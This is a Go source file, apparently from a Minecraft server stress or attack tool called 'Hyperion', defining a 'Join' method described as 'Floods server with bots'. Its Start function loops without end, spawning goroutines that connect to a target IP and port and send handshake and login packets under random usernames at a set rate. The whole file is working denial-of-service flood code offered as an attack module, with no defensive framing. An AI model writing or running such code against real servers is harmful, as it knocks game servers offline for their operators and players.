package methods

import (
	"Hyperion/core"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
	"fmt"
	"strconv"
	"time"
)

type Join struct{}

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start(info core.AttackInfo) {
	for {
		for i := 0; i < info.PerDelay; i++ {
			go func() {
				fmt.Println("CONNECTING")
				conn, err := mc.DialMC(info.Ip + ":" + strconv.Itoa(info.Port))
				if err != nil {
					fmt.Println(err)
				}
				mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
				mcutils.WriteLoginPacket(conn, utils.RandomName(10), false, nil)
			}()
		}
		time.Sleep(info.Delay)
	}
}
func (join Join) Stop() {
	// implementation for stopping the join method
}
